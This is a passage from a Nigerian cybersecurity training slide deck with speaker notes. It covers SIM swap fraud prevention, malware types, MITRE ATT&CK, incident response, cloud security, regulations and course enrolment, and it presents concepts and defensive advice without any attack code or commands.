We feel obligated    Creates trust        on commitments

EVERY PHISHING EMAIL, VISHING CALL, AND SMISHING TEXT
USES AT LEAST ONE OF THESE.
OFTEN MULTIPLE.

Recognition = resistance.
Teach this to every employee in your future organisation.
```

**Speaker notes:** Ask students to identify which principles are used in the ATM scam from Module 1. (Authority: bank uniform. Urgency: machine is "having an issue." Liking: friendly demeanour.) All three in one 2-minute interaction.

---

## SLIDE 30 — SIM SWAP — THE NIGERIAN EPIDEMIC

**Visual:** Timeline diagram showing the SIM swap attack from attacker's perspective. Steps numbered. Red warning icons at each step. At the end: empty bank account.

**Content:**
```
HOW SIM SWAP FRAUD WORKS

① PREPARATION
  Attacker buys victim data: name, address, DOB, phone number
  Sources: data brokers (₦500/record), social media, previous breaches

② VISIT TELCO
  Attacker visits an MTN/Airtel store with fake ID
  Claims lost SIM for victim's number
  Weak verification → new SIM issued to attacker

③ YOUR PHONE DIES
  Your SIM loses signal. You don't know why.
  (Often happens at night when you won't notice immediately)

④ THE DRAIN
  Attacker receives all your SMS OTPs
  Resets your banking app, mobile wallet
  Cleans out accounts by morning

PREVENTION:
✓ Add SIM lock PIN with your telecom
✓ Use authenticator apps (Google Authenticator/Authy) not SMS OTP
✓ Enable transfer alerts — any movement wakes you up
✓ If phone signal dies unexpectedly in covered area — call bank IMMEDIATELY
```

**Speaker notes:** Every student should do this after class: call their telecom and ask for a SIM lock. This is a 5-minute action that significantly raises the bar for SIM swap attacks.

---

## SLIDE 31 — MODULE 9 OPENER: MALWARE ANALYSIS

**Visual:** Process tree on black background — parent processes spawning child processes in red, showing malware execution chain. ANY.RUN interface stylised.

**Content:**
```
LEVEL: ADVANCED

MODULE 09

MALWARE ANALYSIS

"To defend against malware, you must understand
 exactly what it does, step by step."

Malware classification (virus/worm/trojan/ransomware)
Safe analysis environment setup
Static analysis (VirusTotal, strings, hashes)
Dynamic analysis (ANY.RUN sandbox)
MITRE ATT&CK framework mapping
IOC extraction and threat reporting
```

**Speaker notes:** Safety briefing before ANY lab: "We NEVER execute malware samples on our primary machines. Isolated VM, snapshot before, revert after. This is non-negotiable."

---

## SLIDE 32 — MALWARE TYPES

**Visual:** Six cards in a 2×3 grid, each with a different malware type icon, name, brief description, and real-world Nigerian/global example.

**Content:**
```
MALWARE CLASSIFICATION

[RANSOMWARE]              [BANKING TROJAN]          [RAT]
Encrypts your files       Steals banking creds      Remote Access Trojan
Demands payment           Web injection attacks      Full device control
WannaCry, LockBit         Emotet, TrickBot           NjRAT (common in NG)
Nigeria: NCC warned 2017  Nigerian banks targeted     "Bank update" on WhatsApp

[KEYLOGGER]               [CRYPTOJACKER]             [SPYWARE]
Records all keystrokes    Mines crypto using          Silent monitoring
Captures passwords        YOUR computer              Corporate espionage
Credit card numbers        High electricity bills     Stalkerware
SMS OTPs                  Nigerian cafes: notable     Mobile spyware

MODERN REALITY:
Most attacks use MULTIPLE types combined
(e.g., Emotet = trojan + downloader + lateral movement + spam module)
```

**Speaker notes:** The WhatsApp delivery vector for RATs is specifically Nigerian context. Many students have received "bank update APK" files or similar on WhatsApp. These are RATs. Never install APKs from WhatsApp.

---

## SLIDE 33 — MITRE ATT&CK FRAMEWORK

**Visual:** ATT&CK matrix grid showing tactics across the top (Initial Access, Execution, Persistence, etc.) and technique names in cells below. Certain cells highlighted in red showing an attack chain path.

**Content:**
```
MITRE ATT&CK FRAMEWORK

"A knowledge base of adversary tactics and techniques
 based on real-world observations"

TACTICS (the WHY)            → TECHNIQUES (the HOW)

Initial Access               Phishing, Drive-by, Supply Chain
Execution                    Macro, PowerShell, Command Line
Persistence                  Registry keys, Scheduled Tasks, Startup
Privilege Escalation         Exploit vulnerabilities, Token theft
Defence Evasion              Obfuscation, Signed Binary, Rootkit
Credential Access            Keylogging, LSASS dump, Brute Force
Lateral Movement             Pass-the-Hash, RDP, SMB
Exfiltration                 Via encrypted channel, DNS tunnel
Impact                       Encrypt for ransomware, Wiper, DDoS

WHY IT MATTERS:
→ Common language for threat intelligence sharing
→ Maps malware behaviour to standardised technique IDs
→ Helps defenders identify gaps in detection coverage
→ Used in every professional malware analysis report
```

**Speaker notes:** After ANY.RUN shows malware behaviour, have students map each observed behaviour to an ATT&CK technique. This bridges dynamic analysis to threat intelligence.

---

## SLIDE 34 — MODULE 10 OPENER: INCIDENT RESPONSE

**Visual:** Security Operations Centre aesthetic — multiple monitors, alert feeds, incident timeline on one screen. Serious but controlled atmosphere.

**Content:**
```
LEVEL: PROFESSIONAL

MODULE 10

INCIDENT RESPONSE &
DIGITAL FORENSICS

"It's not if you get breached. It's when.
 The difference is whether you're ready."

NIST IR lifecycle (4 phases)
Detection and triage · Containment
Digital forensics (evidence preservation)
Log analysis and timeline reconstruction
NDPA 2023 breach notification (72 hours)
```

**Speaker notes:** This module is where the emotional tone of the course shifts. Students have been learning offensive techniques. Now they learn what it feels like to be the defender when something is actively happening. The tabletop exercise is the centrepiece.

---

## SLIDE 35 — NIST INCIDENT RESPONSE LIFECYCLE

**Visual:** Four-phase circular lifecycle diagram. Each phase has an icon and 3–4 bullet points of key activities. The phases connect in a loop — learning from incidents feeds back into preparation.

**Content:**
```
NIST INCIDENT RESPONSE LIFECYCLE

          ① PREPARATION
          ────────────────────────────────
          Incident Response Plan (IRP)
          Incident Response Team (IRT)
          SIEM + IDS/IPS + EDR deployed
          Tabletop exercises run regularly
                    │
        ④ POST-INCIDENT     ② DETECTION & ANALYSIS
        ─────────────────   ────────────────────────
        Lessons learned     What systems affected?
        Update IR plan      What data at risk?
        Share intelligence  Is attack ongoing?
        Brief leadership    Classify severity (P1–P4)
                    │           │
                    └─── ③ CONTAINMENT, ERADICATION & RECOVERY
                         ────────────────────────────────────────
                         Isolate systems (don't turn off!)
                         Forensic images BEFORE wiping
                         Remove threat completely
                         Restore from clean backups

Average time to detect breach: 197 days
With mature IR programme: hours to days
```

**Speaker notes:** The 197-day statistic should be met with disbelief. Explain: organisations aren't blind — they're overwhelmed. Alert fatigue. Too many events, too few analysts to investigate. SIEM tuning and proper triage is what closes this gap.

---

## SLIDE 36 — DIGITAL FORENSICS RULES

**Visual:** Five golden rules displayed as numbered cards. Evidence chain of custody diagram below showing hand-off points.

**Content:**
```
DIGITAL FORENSICS — THE 5 GOLDEN RULES

1. PRESERVE THE ORIGINAL
   Never work on original evidence — always forensic copies
   Write blockers prevent accidental modification

2. CHAIN OF CUSTODY
   Document every person who touches evidence + timestamp
   Any gap in chain can invalidate evidence in court

3. DOCUMENT EVERYTHING
   Time-stamped notes for every single action taken
   Screenshot, write, photograph

4. DON'T ALTER THE EVIDENCE
   Read-only mounting. Verify hash before and after.
   Never open malware samples on the evidence drive

5. HASH VERIFICATION
   SHA-256 hash the original before copying
   SHA-256 hash the copy after
   Matching hashes = forensically sound copy

ORDER OF VOLATILITY (collect from most volatile first):
RAM → Network state → Running processes → Disk → Remote logs
```

**Speaker notes:** The "don't turn off" rule for incident response surprises students. Explain: RAM contains running processes, network connections, encryption keys, and evidence that vanishes the moment power is cut. Memory forensics may be the only way to recover ransomware decryption keys.

---

## SLIDE 37 — MODULE 11 OPENER: CLOUD SECURITY

**Visual:** Cloud icon above an organisation. Arrows showing data flowing to cloud services (AWS, Azure, Google Cloud logos stylised). Shared responsibility dividing line shown.

**Content:**
```
LEVEL: PROFESSIONAL

MODULE 11

CLOUD SECURITY &
EMERGING TECHNOLOGIES

"The cloud is the most important
 infrastructure shift in 30 years.
 It's also the most misconfigured."

AWS Shared Responsibility Model
IAM least privilege · S3 misconfiguration
CloudTrail · GuardDuty · Security Hub
Mobile application security (OWASP Mobile Top 10)
API security · IoT security
```

**Speaker notes:** Cloud is where most new Nigerian tech infrastructure lives. AWS Lagos region (af-south-1) opened in 2021 — Nigerian organisations have a nearby option. Understanding cloud security is increasingly a mandatory skill for any security professional.

---

## SLIDE 38 — SHARED RESPONSIBILITY MODEL

**Visual:** Two-column split. Left column (labelled "AWS Manages"): data centre, hardware, hypervisor. Right column (labelled "YOU Manage"): data encryption, IAM, app security, network config. A dividing line in the middle clearly demarcates responsibility.

**Content:**
```
CLOUD SHARED RESPONSIBILITY

AWS RESPONSIBLE                    CUSTOMER RESPONSIBLE
────────────────────               ─────────────────────────
Physical data centres              Your data (encryption, classification)
Hardware (servers, switches)       IAM (who has access to what)
Network infrastructure             Security groups (your firewall rules)
Hypervisor / virtualisation        Operating systems on your VMs
Managed service patches            Your application code
                                   Logging configuration
                                   Backup strategy

THE CRITICAL MISUNDERSTANDING:
"It's in the cloud so it's secure" = WRONG
AWS has never been breached at the infrastructure level.
Every cloud breach has been in the CUSTOMER'S responsibility zone.

IAM misconfiguration, exposed S3 buckets, missing MFA, weak passwords.
AWS can't fix what you misconfigured.

"Shared responsibility" means you're responsible for a LOT.
```

**Speaker notes:** Show the actual AWS shared responsibility model diagram (available on aws.amazon.com). The concept of responsibility "shifting" based on service type (IaaS vs PaaS vs SaaS) is important for advanced students.

---

## SLIDE 39 — TOP CLOUD SECURITY MISTAKES

**Visual:** Six mistake cards in a 2×3 grid. Each card has a red warning icon, the mistake title, real-world consequence, and the fix.

**Content:**
```
THE 6 MOST COMMON CLOUD SECURITY FAILURES

[PUBLIC S3 BUCKET]         [NO IAM MFA]              [OVER-PRIVILEGED ROLES]
Exposed customer data      Password = access          Service with admin access
"Click to make public"     Brute force wins           Blast radius is everything
Fix: Remove public access  Fix: MFA mandatory         Fix: Least privilege always

[OPEN SECURITY GROUPS]     [HARDCODED CREDENTIALS]    [NO CLOUDTRAIL LOGGING]
Database port open          Dev pushed AWS keys       Can't detect breach
to 0.0.0.0/0               to GitHub                  Can't do forensics
"Tested in dev, forgot"     Attacker finds in hours    Fix: Enable day 1
Fix: Only specific IPs      Fix: Use IAM roles, not keys. Enable secret scanning.

CASE STUDY:
2019: Major Nigerian retailer — misconfigured S3 bucket exposed 800,000 customer records.
Found by security researcher. Could have been found by attacker first.
→ No encryption, no IAM restriction, no logging enabled.
```

**Speaker notes:** The Nigerian case study brings this home. Ask: "How many of you have heard of a company's data being 'hacked' in Nigeria?" Most hands go up. "Almost none of those were infrastructure hacks. Almost all were misconfigurations." Cloud security is largely about doing the basics right.

---

## SLIDE 40 — MODULE 12 OPENER: GRC

**Visual:** Organisation chart showing security at the board level. Policy documents, risk heatmap, and compliance checklist as visual elements. Professional, corporate aesthetic.

**Content:**
```
LEVEL: PROFESSIONAL

MODULE 12

GOVERNANCE, RISK &
COMPLIANCE (GRC) +
FUTURE OF CYBERSECURITY

"Security is not just a technical problem.
 It is a business problem with technical solutions."

GRC framework · Risk assessment methodology
Nigerian regulatory landscape (CBN, NDPA, NCC, NITDA)
ISO 27001 · NIST CSF 2.0 · PCI DSS
Communicating security to boards
Zero Trust · AI in security · Post-quantum cryptography
```

**Speaker notes:** The final module reframes everything. Technical skills enable security. Business skills make security effective. Students who can translate security into business language — risk, cost, regulation — will rise to leadership.

---

## SLIDE 41 — NIGERIAN REGULATORY LANDSCAPE

**Visual:** Four overlapping circles showing four regulators. Each circle has the regulator's name, the type of organisation it covers, and key security requirements.

**Content:**
```
NIGERIAN CYBERSECURITY REGULATIONS

CBN CYBERSECURITY              NDPA 2023
FRAMEWORK (2022)               ─────────────────────────────
All licensed banks             Any org processing personal data
Annual pentest required        Data Protection Impact Assessment
CISO mandatory                 DPO required (large processors)
Incident reporting to CBN:     Breach notification: 72 hours to NDPC
24 hours for major incidents   Technical security measures mandatory
                               
NCC GUIDELINES                 NITDA GUIDELINES
─────────────────              ─────────────────────────────
Telecom operators              All IT companies
MTN, Airtel, Glo, 9Mobile     Cybersecurity standards
Customer data protection       Data localisation requirements
Network security standards     ngCERT coordination

ngCERT (ng-cert.gov.ng):
Nigeria's national Computer Emergency Response Team
Report incidents · Get threat intelligence · Join the community
```

**Speaker notes:** The CBN 24-hour incident reporting requirement catches students off guard. "For banks, you have 24 hours to report to CBN — which is faster than the NDPA 72-hour requirement to the NDPC. If you work in banking, CBN reporting takes priority."

---

## SLIDE 42 — RISK COMMUNICATION TO BOARDS

**Visual:** Two text blocks side by side. Left: "Technical Language" (red border — wrong). Right: "Business Language" (green border — right). Arrow pointing from left to right.

**Content:**
```
SPEAKING SECURITY TO LEADERSHIP

TECHNICAL (what not to say):       BUSINESS (what to say):
──────────────────────────         ──────────────────────────────────────
"We have 47 CVEs with              "Our current vulnerability profile is
 CVSS > 7.0 on production.         similar to Equifax before their 2017
 Our patching cadence is           breach, which cost $575M. We face
 68 days average. We need          regulatory action from CBN and NDPA
 WAF deployment and SOC            2023 compliance risk. Investing ₦120M
 tier 2 capability."               in 5 specific controls reduces our risk
                                   exposure by 65% — a 13× ROI if we
                                   avoid a comparable incident."

SECURITY METRICS THAT MATTER TO BOARDS:
• Mean Time to Detect (MTTD) — how long before we notice an attack?
• Mean Time to Respond (MTTR) — how long to contain it?
• Phishing click rate — what % of employees fail simulated phishing?
• Patch compliance % — what % of critical patches applied within SLA?
• Third-party risk coverage — what % of vendors assessed?
```

**Speaker notes:** Practice this translation skill. Take a technical finding and restate it in business terms. Students should do this for every major finding in their capstone reports.

---

## SLIDE 43 — THE FUTURE: ZERO TRUST

**Visual:** Traditional perimeter model (castle with moat) on left labelled "PERIMETER SECURITY — Broken." Zero Trust model on right showing verification at every point, no implicit trust anywhere.

**Content:**
```
ZERO TRUST ARCHITECTURE

THE OLD MODEL:                    ZERO TRUST:
"Trust but verify"                "Never trust, always verify"

Internal network = safe           EVERYTHING is untrusted
External network = dangerous      Every request must prove itself

If attacker breaches perimeter:   Even if attacker is inside:
→ Free access to everything       → Still blocked by zero trust

ZERO TRUST PILLARS:
Identity      → Verify WHO you are (MFA mandatory)
Device        → Verify WHAT device you're on (MDM, compliance check)
Network       → Micro-segmentation — no lateral movement
Application   → Verify access to each app individually
Data          → Data-level encryption, classification, DLP

IMPLEMENTATION (not a product — it's an architecture):
Start with: MFA everywhere → Least privilege IAM → Microsegmentation
→ It's a journey, not a checkbox. Budget 2–3 years for full implementation.
```

**Speaker notes:** Zero Trust is not a vendor product you can buy. Every major security vendor has a "Zero Trust platform" they want to sell you. The reality: it's an architectural philosophy that requires changes across identity, network, application, and data layers.

---

## SLIDE 44 — AI IN CYBERSECURITY

**Visual:** Split screen. Left: Red AI (attacker) generating phishing emails, automated scanning. Right: Blue AI (defender) detecting anomalies, correlating alerts, automated response.

**Content:**
```
AI — BOTH SIDES OF THE BATTLE

ATTACKERS USING AI:                 DEFENDERS USING AI:
─────────────────────               ────────────────────────────
AI-generated phishing at scale      UEBA: Detect unusual behaviour
(personalised for millions)         patterns vs AI baseline

Deepfake audio/video CEO            AI SIEM: Correlate and prioritise
voice clone for vishing             thousands of alerts, reduce noise

Automated vulnerability             Automated response: Contain
research and exploitation           threats without human delay

AI-powered password cracking        Code analysis: Find security bugs
Adaptive malware that evades AV     before deployment

THE ARMS RACE:
AI makes attacks cheaper and more personalised.
AI makes defences faster and more adaptive.
Humans are still needed for judgement, ethics, and novel situations.
The professional who can work WITH AI tools is the most valuable.
```

**Speaker notes:** Nigeria is particularly vulnerable to AI-generated deepfake attacks because of the prevalence of voice-call-based fraud (vishing). AI can clone a CEO's voice from 5 seconds of audio. This is not hypothetical — it has happened to companies globally.

---

## SLIDE 45 — CAPSTONE OPTIONS

**Visual:** Five project cards horizontally. Each has a title, icon, and brief description. Card A has "Most Technical" badge, Card D has "Great for non-coders" badge.

**Content:**
```
CAPSTONE PROJECT — CHOOSE YOUR PATH

A. PENETRATION TEST REPORT        B. SOC SIMULATION
   Full pentest on lab environment   Set up mini-SOC with SIEM
   PTES methodology                  15+ detection rules
   Professional report delivery      Analyse 50 provided alerts
   (Most technical)                  3 full incident reports

C. MALWARE ANALYSIS REPORT        D. SECURITY AWARENESS PROGRAMME
   Static + dynamic analysis         Design for a real Nigerian org
   MITRE ATT&CK mapping              3 training modules + phishing sim
   IOC extraction + YARA rule        Pilot it. Present feedback.
   Threat intelligence report        (Great for career changers)

E. CYBERSECURITY STRATEGY
   Complete strategy for Nigerian SME
   Risk assessment + NIST CSF roadmap
   5 security policies
   Board presentation (10 slides max)

ALL CAPSTONES: Required for certification | Blockchain-verified
```

**Speaker notes:** Guide students to their path based on career goal. Want SOC analyst? Option B is perfect practice. Want to be a penetration tester? Option A. Career changer from training/HR? Option D.

---

## SLIDE 46 — CERTIFICATION EXAM

**Visual:** Exam structure overview as a visual breakdown. Four sections shown as weighted blocks. Timer, certificate badge, and blockchain verification icon displayed.

**Content:**
```
CERTIFICATION EXAM — METABRIDGE CYBERSECURITY PROFESSIONAL

SECTION A: Multiple Choice          40 questions    40 marks   90 min
  All 12 modules represented

SECTION B: Short Answer             4 of 6 questions 20 marks  60 min
  Explain, describe, demonstrate understanding

SECTION C: Case Studies             2 cases          25 marks  60 min
  Case 1: Nigerian bank breach (incident response)
  Case 2: Lagos trading company BEC attack

SECTION D: Essay (choose 1)         1 essay          15 marks  30 min
  Option 1: Nigerian cybersecurity challenges
  Option 2: Zero Trust implementation roadmap

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PASS: 75%    DISTINCTION: 85%+
4 hours total | Proctored online
Blockchain-verified certificate for all who pass
```

**Speaker notes:** The case studies are the most practical section. They test whether students can apply knowledge, not just recall it. The Nigerian bank breach case will require students to reference NDPA 2023 requirements — reinforcing the legal context throughout.

---

## SLIDE 47 — THE METABRIDGE CYBERSECURITY DIFFERENCE

**Visual:** Comparison table. Left: Generic online cybersecurity course. Right: MetaBridge Academy. Green check marks down the MetaBridge column.

**Content:**
```
WHY METABRIDGE CYBERSECURITY?

GENERIC ONLINE COURSE         METABRIDGE ACADEMY
────────────────              ──────────────────────────────────
Global examples               Nigerian context throughout (CBN, NDPA, NIBSS)
Video-only labs               Live hands-on labs (Kali, Burp, ANY.RUN)
PDF certificate               Blockchain-verified credential
No legal context              Cybercrimes Act 2015 integrated
Theoretical datasets          Real Nigerian attack patterns
No local threat intel         SIM swap, BEC, smishing — all covered
Email support only            WhatsApp mentor access

REFERENCE TEXTBOOK INTEGRATION:
Cybersecurity Sefer — metabridgeacademy.com
The theoretical foundation beneath every module.

12 lab platforms. 12 modules. 1 career-changing certificate.
Verifiable anywhere in the world. Instantly.
```

**Speaker notes:** Use this slide for prospective student info sessions. The blockchain verification angle is genuinely unique — position it as the key differentiator.

---

## SLIDE 48 — WHAT EMPLOYERS TEST IN INTERVIEWS

**Visual:** Interview scenario. Four boxes showing the four types of interview rounds with sample questions.

**Content:**
```
CYBERSECURITY INTERVIEWS — WHAT THEY ACTUALLY ASSESS

TECHNICAL ROUND:                    PRACTICAL ROUND:
□ Explain how SQL injection works   □ Here's a PCAP — find the attack
□ What's the difference between     □ What's wrong with this code?
  IDS and IPS?                      □ Set up these firewall rules
□ How would you respond to a
  ransomware alert at 3 AM?

KNOWLEDGE ROUND:                    SOFT SKILLS ROUND:
□ What's the OWASP Top 10?         □ Explain XSS to a non-technical CFO
□ What is Zero Trust?              □ You find a critical vulnerability
□ What are the NDPA 2023             before going live — what do you do?
  breach notification requirements? □ How do you handle a colleague who
                                      bypasses security controls?

This course prepares you for ALL FOUR types.
After the capstone, you have evidence to show, not just knowledge to cite.
```

**Speaker notes:** The soft skills round is where many technical students fail. Practice explaining security concepts in plain language. The Feynman technique: if you can't explain it simply, you don't understand it well enough.

---

## SLIDE 49 — TOOLS YOU'LL MASTER

**Visual:** Tool logos arranged by category. Each with name and brief role description. All tools free or open source.

**Content:**
```
YOUR PROFESSIONAL TOOLKIT

ANALYSIS & TESTING              NETWORK SECURITY
Kali Linux (500+ tools)         Wireshark (packet analysis)
Burp Suite Community            Nmap (port/service scanning)
OWASP ZAP (web scanner)         Shodan (internet reconnaissance)
Metasploit Framework            iptables / UFW (firewall config)

MALWARE ANALYSIS                CRYPTOGRAPHY & OSINT
ANY.RUN (sandbox)               CyberChef (decode/encrypt)
VirusTotal (multi-AV scan)      crt.sh (certificate transparency)
CyberChef (deobfuscation)       Have I Been Pwned (breach check)

LEARNING & PRACTICE             REFERENCE TEXTBOOK
TryHackMe                       Cybersecurity Sefer
HackTheBox (post-course)        metabridgeacademy.com
OWASP WebGoat
OWASP DVWA

ALL TOOLS: FREE OR OPEN SOURCE
Your lab is your laptop.
```

**Speaker notes:** Kali Linux is the key. Download it. Install it in VirtualBox. This is your professional environment. Every security professional has Kali available somewhere. Getting comfortable with it takes practice — start day 1.

---

## SLIDE 50 — BUILDING YOUR SECURITY PORTFOLIO

**Visual:** Portfolio website mockup showing projects, certifications, and write-ups. GitHub icon for write-ups. TryHackMe profile badge. LinkedIn profile.

**Content:**
```
FROM STUDENT TO PROFESSIONAL

YOUR PORTFOLIO SHOULD INCLUDE:

✓ MetaBridge blockchain certificate (verifiable link)
✓ TryHackMe profile (show rooms completed, rank achieved)
✓ Capstone project write-up on GitHub
✓ CTF (Capture The Flag) competition write-ups
✓ Penetration test lab reports (from authorised TryHackMe/HackTheBox)
✓ Any bug bounty findings (even informational — shows you tried)

YOUR LINKEDIN HEADLINE:
"Cybersecurity Professional | CompTIA Security+ | MetaBridge Certified
 Penetration Testing | Incident Response | Kali Linux"

NEXT CERTIFICATIONS TO TARGET:
CompTIA Security+ → CySA+ → CEH → OSCP

JOIN:
ngCERT community (ng-cert.gov.ng)
LinkedIn cybersecurity groups
ISACA Nigeria chapter
```

**Speaker notes:** Portfolio over CV. Employers want proof, not promises. A GitHub with 5 well-documented security lab write-ups demonstrates more than a CV listing "knowledge of cybersecurity."

---

## SLIDE 51 — YOUR ROLE IN NIGERIA'S DIGITAL FUTURE

**Visual:** Nigeria map with digital network overlay. Connection lines to major cities. Text highlighting the opportunity and responsibility.

**Content:**
```
THE MISSION

Nigeria is building a digital economy.
₦12 trillion flows through NIBSS monthly.
220 million mobile connections.
50+ million Nigerians on mobile banking.
Government digitisation accelerating.

ALL OF IT IS BEING TARGETED.

The deficit of trained cybersecurity professionals
in Nigeria is enormous.

YOU are the answer to that deficit.

Every MetaBridge cybersecurity professional who:
→ Protects a Nigerian fintech or bank
→ Responds to an incident with competence
→ Trains employees to spot phishing
→ Builds a security culture in a Nigerian organisation
...is building the digital immune system of a nation.

This is not a small thing.
```

**Speaker notes:** Let this slide breathe. Pause after it. This is the motivational close. Students should feel the weight and privilege of what they're entering. The emotional close matters as much as the technical content.

---

## SLIDE 52 — CONTINUING YOUR JOURNEY

**Visual:** Roadmap showing post-graduation path. Three stages with specific actions and timelines.

**Content:**
```
WHAT HAPPENS AFTER GRADUATION

IMMEDIATELY:
□ Download and claim your blockchain certificate
□ Complete your capstone project (if not done)
□ Update LinkedIn with MetaBridge certification
□ Create/update TryHackMe profile
□ Register for CompTIA Security+ study

IN 30–60 DAYS:
□ Apply to entry-level SOC or security analyst roles
□ Complete 10+ TryHackMe rooms for portfolio
□ Register for a local security Meetup or ngCERT events
□ Start CompTIA Security+ exam prep (SY0-701)

IN 3–6 MONTHS:
□ CompTIA Security+ exam
□ First professional security role
□ Begin building specialisation (pentest? SOC? GRC?)

IN 1–2 YEARS:
□ CEH or CySA+ certification
□ Senior analyst or specialist role
□ Consider OSCP (the pinnacle of practical pentesting)
□ Mentor someone newer than you
```

**Speaker notes:** The mentoring point is important. The Nigerian security community is small. Everyone knows everyone. Being known as someone who helps others grow accelerates your own career more than almost anything else.

---

## SLIDE 53 — ENROL / NEXT COHORT

**Visual:** Full dark card with gold border. MetaBridge logo centered. WhatsApp icon prominent. Urgency of the opportunity communicated.

**Content:**
```
READY TO PROTECT NIGERIA'S DIGITAL FUTURE?

Join MetaBridge Academy's next cybersecurity cohort.

✓ 12 Modules · 46+ Contact Hours
✓ 12 professional lab platforms
✓ Hands-on Nigerian threat scenarios
✓ 1-on-1 WhatsApp mentor support
✓ Capstone project for your portfolio
✓ Blockchain-verified professional certificate

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ENROL NOW → wa.me/2347034357206

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

metabridgeacademy.com
Reference: Cybersecurity Sefer — metabridgeacademy.com
```

**Speaker notes:** End every session with this. The WhatsApp link is the call to action. For existing students: ask them to share this with anyone who asks about getting into cybersecurity.

---

## SLIDE 54 — CLOSING SLIDE

**Visual:** Full-bleed dark navy. Glowing shield icon in center. Quote large and centered in white.

**Content:**
```
"Security is not a product you can buy.
 It is a process you must practice."

— Bruce Schneier

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Thank you for learning with MetaBridge Academy.

Stay curious. Stay ethical. Stay dangerous.

metabridgeacademy.com  ·  wa.me/2347034357206
```

**Speaker notes:** "Stay dangerous" — dangerous to attackers, through skill and knowledge. Leave students with this three-part code: curious (never stop learning), ethical (authorisation first), dangerous (competent enough to make a difference).

---

## PRODUCTION NOTES

**Slide count:** 54 slides across 12 modules (4–5 per module)

**Slide distribution by module:**
- Module 1: Slides 4–8 (5 slides)
- Module 2: Slides 9–12 (4 slides)
- Module 3: Slides 13–15 (3 slides)
- Module 4: Slides 16–19 (4 slides)
- Module 5: Slides 20–22 (3 slides)
- Module 6: Slides 23–24 (2 slides)
- Module 7: Slides 25–27 (3 slides)
- Module 8: Slides 28–30 (3 slides)
- Module 9: Slides 31–33 (3 slides)
- Module 10: Slides 34–36 (3 slides)
- Module 11: Slides 37–39 (3 slides)
- Module 12: Slides 40–44 (5 slides)
- Programme-level: Slides 1–3, 45–54 (13 slides)

**Design specs:**
- Background: #050B18
- Primary accent: #1A6CFF (electric blue)
- Secondary accent: #00D4FF (cyan)
- Highlight: #FFB800 (gold)
- Threat/danger: #FF4444 (red)
- Text: #FFFFFF (white) and #8892A4 (muted)
- Code font: JetBrains Mono
- Display font: Syne
- Body font: Outfit

**Key live demo slides:** Slides 14 (Linux commands in terminal), 21 (firewall rules in terminal), 22 (Shodan live search), 27 (SQL injection on WebGoat/DVWA), 33 (MITRE ATT&CK with malware sample)

---

*MetaBridge Academy | Cybersecurity Slide Deck | 54 Slides*
*Textbook reference: Cybersecurity Sefer — metabridgeacademy.com*
*All enrolment: https://wa.me/2347034357206*
